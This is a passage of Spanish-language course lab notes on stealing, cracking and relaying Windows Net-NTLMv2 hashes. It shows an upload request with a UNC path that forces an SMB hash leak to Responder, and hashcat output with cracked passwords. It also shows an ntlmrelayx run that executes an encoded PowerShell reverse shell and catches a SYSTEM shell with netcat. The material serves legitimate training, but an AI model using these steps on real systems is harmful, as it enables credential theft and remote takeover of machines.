kali@kali:~/labs$ hashcat -m 5600  hash.txt /usr/share/wordlists/rockyou.txt --show
PAUL::FILES01:72d22da8b3aefa0e:c7d2976d1ceff66576d613dc947e13eb:01010000000000000079719a9d84d9018050a47218bfb5230000000002000800590048004a00410001001e00570049004e002d0054005a0051004e00520032004300390039004b004c0004003400570049004e002d0054005a0051004e00520032004300390039004b004c002e00590048004a0041002e004c004f00430041004c0003001400590048004a0041002e004c004f00430041004c0005001400590048004a0041002e004c004f00430041004c00070008000079719a9d84d901060004000200000008003000300000000000000000000000002000007f1bd75bae0ffde594bca74c62b4d3cb1656aec27e52436eb09106e3ac6c5c580a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340035002e003100370036000000000000000000:123Password123
```

Y con las credenciales podríamos tener acceso GUI que será más ventajoso.

<br />

**2. Enumerate VM #2 and find a way to obtain a Net-NTLMv2 hash via the web application. Important: Add marketingwk01 to your /etc/hosts file with the corresponding IP address of the machine. After you have obtained the Net-NTLMv2 hash, crack it, and connect to the system to find the flag.**

Accedemos a la web y encontramos una funcionalidad de subida de ficheros. Si el servidor está malconfigurado ( y es Windows) puede ser que esté diseñado para intentar recorger ficheros remotos a través de SMB. Así, capturamos una request a través de BurpSuite y plantamos un SMB path para obtener un fichero en nuestra máquina a través de SMB:

```
POST /upload HTTP/1.1
Host: marketingwk01:8000
Content-Length: 1621
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://marketingwk01:8000
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAJo6OsdZi9RLo5RB
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://marketingwk01:8000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

------WebKitFormBoundaryAJo6OsdZi9RLo5RB
Content-Disposition: form-data; name="myFile"; filename="\\\\192.168.45.182\\cmdasp.aspx"

Content-Type: application/octet-stream

<%@ Page Language="C#" Debug="true" Trace="false" %>
[...]
```

De esta forma, antes de enviar la request activamos el Responder:

```
┌──(kali㉿kali)-[~]
└─$ sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [192.168.45.182]
    Responder IPv6             [fe80::721b:7a6:66a5:1b44]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-PRHURFZ8003]
    Responder Domain Name      [10MB.LOCAL]
    Responder DCE-RPC Port     [49301]

[+] Listening for events...              
```

Y enviamos la request, obteniendo unas credenciales:

```
[...]

[+] Listening for events...                                                                                         

[SMB] NTLMv2-SSP Client   : 192.168.221.210
[SMB] NTLMv2-SSP Username : MARKETINGWK01\sam
[SMB] NTLMv2-SSP Hash     : sam::MARKETINGWK01:d37530b4004ab302:A970DA03C0D2CF4CA627ED375321B0EB:010100000000000080C4B1FDD7ADD9012A4A6A863093BFC90000000002000800310030004D00420001001E00570049004E002D005000520048005500520046005A00380030003000330004003400570049004E002D005000520048005500520046005A0038003000300033002E00310030004D0042002E004C004F00430041004C0003001400310030004D0042002E004C004F00430041004C0005001400310030004D0042002E004C004F00430041004C000700080080C4B1FDD7ADD9010600040002000000080030003000000000000000000000000020000095498AE6D147C85F8F155846737A786170FD6550A4130037FA9A9EC493CE37BB0A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003100380032000000000000000000                                                                           
[*] Skipping previously captured hash for MARKETINGWK01\sam
[*] Skipping previously captured hash for MARKETINGWK01\sam
[*] Skipping previously captured hash for MARKETINGWK01\sam
[*] Skipping previously captured hash for MARKETINGWK01\sam
```

Así, hemos obtenido un NTLMv2 hash y procedemos a crackearlo con Hashcat:

```
┌──(kali㉿kali)-[~]
└─$ hashcat -h | grep -i ntlmv2                                                                             
   5600 | NetNTLMv2                                                  | Network Protocol
  27100 | NetNTLMv2 (NT)                                             | Network Protocol
                                                                                                                    
┌──(kali㉿kali)-[~]
└─$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --show
SAM::MARKETINGWK01:d37530b4004ab302:a970da03c0d2cf4ca627ed375321b0eb:010100000000000080c4b1fdd7add9012a4a6a863093bfc90000000002000800310030004d00420001001e00570049004e002d005000520048005500520046005a00380030003000330004003400570049004e002d005000520048005500520046005a0038003000300033002e00310030004d0042002e004c004f00430041004c0003001400310030004d0042002e004c004f00430041004c0005001400310030004d0042002e004c004f00430041004c000700080080c4b1fdd7add9010600040002000000080030003000000000000000000000000020000095498ae6d147c85f8f155846737a786170fd6550a4130037fa9a9ec493ce37bb0a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340035002e003100380032000000000000000000:DISISMYPASSWORD
```

<br />

#### 21.3.4. Relaying Net-NTLMv2.

Puede darse el caso de que hayamos conseguido el hash de un usuario pero no podamos crackearlo debido a la complejidad del hash. En este caso todavía podemos realizar lo que se conoce como un *relay attack*.

Este consiste en utilizar (una vez tenemos acceso a una máquina) el comando *dir* para crear una conexión SMB hacia nuestra kali que desviaremos hacia otra máquina para obtener permisos.

Supongámos que tenemos acceso a FILE01 y FILE02, dos máquinas que comparten un usuario con las mismas credenciales. Entonces, en este contexto y suponiendo que las máquinas tienen desactivado el UAC o que el usuario en ambos casos comparten privilegios administrativos en ambas máquinas, podemos utilizar de la colección Impacket. Esta herramienta hace el trabajo pesado por nosotros al configurar un servidor SMB y transmitir la parte de autenticación de una conexión SMB entrante a un destino de nuestra elección.

Usaremos **--no-http-server** para deshabilitar el servidor HTTP ya que estamos transmitiendo una conexión SMB y **-smb2support** para agregar soporte para _SMB2_. También usaremos **-t** para establecer el objetivo en FILES02. Finalmente, configuraremos nuestro comando con **-c** , que se ejecutará en el sistema de destino a tarvés el usuario redirigido. Usaremos un reverse shell de PowerShell de una sola línea, que codificaremos en base64 y ejecutaremos con **-enc** como lo hemos hecho antes en este curso. 

Debemos tener en cuenta que el reverse shell de PowerShell codificado en base64 se acorta en la siguiente lista, pero usa la IP de nuestra máquina Kali y el puerto 8080 para que se conecte el reverse shell.

```
kali@kali:~$ sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..." 
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
...
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
```

Activamos un listener para recoger la conexión:

```
kali@kali:~$ nc -nvlp 8080 
listening on [any] 8080 ...
```

Y mandamos la conexióon SMB desde la FILE01:

```
kali@kali:~$  nc 192.168.50.211 5555                                       
Microsoft Windows [Version 10.0.20348.707]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
files01\files02admin

C:\Windows\system32>dir \\192.168.119.2\test
...
```

La ntlmrelayx recibirá una conexión:

```
[*] SMBD-Thread-4: Received connection from 192.168.50.211, attacking target smb://192.168.50.212
[*] Authenticating against smb://192.168.50.212 as FILES01/FILES02ADMIN SUCCEED
[*] SMBD-Thread-6: Connection from 192.168.50.211 controlled, but there are no more targets left!
...
[*] Executed specified command on host: 192.168.50.212
```

Y en nuestror servidor Netcat se abrirá una conexión:

```
connect to [192.168.119.2] from (UNKNOWN) [192.168.50.212] 49674
whoami
nt authority\system

PS C:\Windows\system32> hostname
FILES02

PS C:\Windows\system32> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::7992:61cd:9a49:9046%4
   IPv4 Address. . . . . . . . . . . : 192.168.50.212
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.50.254
```

<br />

**2. Capstone Exercise: Find a way to obtain a Net-NTLMv2 hash from the user _anastasia_ via the web application on VM #3 (BRUTE2) and relay it to VM #4 (FILES02).**



